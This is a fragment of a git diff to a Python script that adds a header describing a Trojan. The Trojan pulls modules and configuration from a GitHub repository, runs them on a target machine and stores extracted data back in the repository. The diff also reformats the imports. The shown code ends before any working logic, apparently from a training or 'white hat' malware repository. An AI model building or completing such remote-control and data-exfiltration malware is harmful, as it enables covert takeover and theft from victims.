@@ -1,13 +1,38 @@
+#! /usr/bin/python
+#################################################################################################
+# Author: Nicholas Fisher
+# Date: March 5th 2024
+# Important Note:
+#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
+# these scripts. They are malicious and should only be used in professionally approved White Hat 
+# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
+# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
+# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
+# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
+# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
+# and if that repository is public, all the extracted data will be available for the whole world to see.
+# Description of Script
+# This script  implements a Trojan horse program that can be used for remote execution of tasks 
+# on a target machine. It uses GitHub as a repository for storing configuration files and modules. 
+# The program continuously checks for updates in the repository, retrieves new modules or 
+# configurations, and executes them. This allows for dynamic and remote control of the 
+# Trojan's behavior. To use the code, you would need to set up a GitHub repository with 
+# the necessary configuration files and modules. You would also need to generate a personal 
+# access token for GitHub API access. An example of using the code would be to create a 
+# repository with a configuration file specifying which modules to run and their parameters. 
+# The Trojan would then fetch this configuration, run the specified modules, and store 
+# the results back in the repository.  !!Belongs in the config module of the Trojan Framework!!
+#################################################################################################
 # Import necessary libraries
-import base64  # Library for base64 encoding and decoding
-import github3  # Library for interacting with GitHub API
-import importlib  # Library for dynamic loading of modules
-import json  # Library for handling JSON data
-import random  # Library for generating random numbers
-import sys  # Library for interacting with the Python runtime environment
-import threading  # Library for threading
-import time  # Library for handling time-related tasks
-from datetime import datetime  # Importing datetime class from datetime module
+import base64  
+import github3  
+import importlib  
+import json  
+import random  
+import sys  
+import threading  
+import time  
+from datetime import datetime
 
 # Function to connect to GitHub using a personal access token
 def github_connect():
